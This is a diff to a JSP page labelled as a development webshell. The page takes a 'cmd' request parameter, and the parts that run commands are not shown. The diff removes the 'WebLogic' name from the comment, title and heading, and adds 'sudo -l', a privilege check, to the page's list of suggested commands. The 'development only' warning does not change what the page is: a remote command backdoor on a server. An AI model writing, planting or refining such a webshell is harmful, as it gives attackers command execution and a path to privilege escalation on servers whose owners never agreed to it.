@@ -1,7 +1,7 @@
 <%@ page import="java.io.*,java.util.*" %>
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%
-    // Simple webshell for development WebLogic server
+    // Simple webshell for development server
     String cmd = request.getParameter("cmd");
     String result = "";
     
@@ -26,7 +26,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Dev WebLogic Webshell</title>
+    <title>Dev Webshell</title>
     <style>
         body { font-family: monospace; margin: 20px; background: #f0f0f0; }
         .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; }
@@ -38,7 +38,7 @@
 </head>
 <body>
     <div class="container">
-        <h2>Dev WebLogic Webshell</h2>
+        <h2>Dev Webshell</h2>
         <p class="warning">WARNING: Development only! Do not use in production.</p>
         
         <form method="get">
@@ -60,6 +60,7 @@
             <li>pwd</li>
             <li>ls -la</li>
             <li>df -h</li>
+            <li>sudo -l</li>
             <li>ps aux | head -10</li>
         </ul>
     </div>
